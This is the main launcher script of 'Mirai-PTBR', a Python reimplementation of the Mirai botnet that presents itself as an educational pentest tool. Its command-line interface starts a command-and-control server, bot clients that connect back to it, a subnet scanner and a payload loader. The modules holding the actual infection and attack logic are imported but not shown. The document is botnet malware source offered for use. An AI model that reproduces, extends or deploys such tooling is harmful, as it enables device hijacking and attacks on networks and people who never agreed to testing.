#!/usr/bin/env python3
"""
Mirai-PTBR - Ferramenta de Pentest Educacional
Mirai Botnet implementado em Python para testes de segurança autorizados.
Uso: python3 main.py [comando] [opções]
"""
import sys
import os

# ═══════════════════════════════════════════════════════════════════════════
# CORREÇÃO DE IMPORTS: Adiciona todos os subdiretórios ao sys.path
# Isso permite que imports "flat" como "from protocol import AttackCommand"
# funcionem sem precisar renomear dezenas de arquivos internos.
_PROJECT_ROOT = os.path.abspath(os.path.dirname(__file__))
for _root, _dirs, _ in os.walk(_PROJECT_ROOT):
    _dirs[:] = [d for d in _dirs if not d.startswith('.') and d != '__pycache__']
    if _root not in sys.path:
        sys.path.insert(0, _root)
# ═══════════════════════════════════════════════════════════════════════════

import argparse
import asyncio
import threading
import time

from cnc.server import MiraiServer
from cnc.client import run_cli


def main():
    # Parser pai com opções globais
    parent_parser = argparse.ArgumentParser(add_help=False)
    parent_parser.add_argument(
        '--verbose', '-v',
        action='store_true',
        help='Modo verboso (log detalhado)'
    )

    parser = argparse.ArgumentParser(
        description='Mirai-PTBR - Botnet educacional para pentest',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    subparsers = parser.add_subparsers(dest='command', help='Comandos disponíveis')

    # Subparser CNC
    cnc_parser = subparsers.add_parser(
        'cnc', parents=[parent_parser],
        help='Inicia o servidor CNC (Command & Control)'
    )
    cnc_parser.add_argument(
        '--host', type=str, default='0.0.0.0',
        help='Host para bind do servidor (default: 0.0.0.0)'
    )
    cnc_parser.add_argument(
        '--port', type=int, default=7000,
        help='Porta para bind do servidor (default: 7000)'
    )

    # Subparser Bot
    bot_parser = subparsers.add_parser(
        'bot', parents=[parent_parser],
        help='Inicia o bot client'
    )
    bot_parser.add_argument(
        '--cnc-host', type=str, default='127.0.0.1',
        help='IP do servidor CNC (default: 127.0.0.1)'
    )
    bot_parser.add_argument(
        '--cnc-port', type=int, default=7000,
        help='Porta do servidor CNC (default: 7000)'
    )

    # Subparser Scanner
    scan_parser = subparsers.add_parser(
        'scanner', parents=[parent_parser],
        help='Inicia o scanner de dispositivos'
    )
    scan_parser.add_argument(
        '--target', type=str, default='192.168.1.0/24',
        help='Rede alvo para scan (default: 192.168.1.0/24)'
    )

    # Subparser Loader
    loader_parser = subparsers.add_parser(
        'loader', parents=[parent_parser],
        help='Inicia o loader de payloads'
    )

    args = parser.parse_args()

    if args.command == 'cnc':
        print(f"[*] Iniciando CNC em {args.host}:{args.port}")
        if args.verbose:
            print("[*] Modo verboso ativado")

        # ─── Inicia o servidor em uma thread asyncio ───────────────────
        server = MiraiServer(host=args.host, port=args.port, verbose=args.verbose)
        server_instance = {'server': server}

        def _start_server():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            server.loop = loop
            try:
                loop.run_until_complete(server.start())
            except Exception as e:
                print(f"\n[!] Erro no servidor: {e}")
            finally:
                loop.close()

        server_thread = threading.Thread(target=_start_server, daemon=True)
        server_thread.start()
        time.sleep(0.5)

        # ─── Inicia a CLI passando a referência do server ─────────────
        from cnc.client import MiraiCLI
        shell = MiraiCLI(
            host=args.host,
            port=args.port,
            verbose=args.verbose,
            server_instance=server
        )
        try:
            shell.cmdloop()
        except KeyboardInterrupt:
            print("\n[!] CNC encerrado pelo usuário.")

    elif args.command == 'bot':
        print(f"[*] Iniciando Bot, conectando ao CNC em {args.cnc_host}:{args.cnc_port}")
        if args.verbose:
            print("[*] Modo verboso ativado")
        from bot.client import run_bot
        run_bot(host=args.cnc_host, port=args.cnc_port, verbose=args.verbose)

    elif args.command == 'scanner':
        print(f"[*] Iniciando Scanner na rede {args.target}")
        from scanner.scanner import run_scanner
        run_scanner(target=args.target, verbose=args.verbose)

    elif args.command == 'loader':
        print("[*] Iniciando Loader")
        from loader.loader import run_loader
        run_loader(verbose=args.verbose)

    else:
        parser.print_help()


if __name__ == '__main__':
    main()
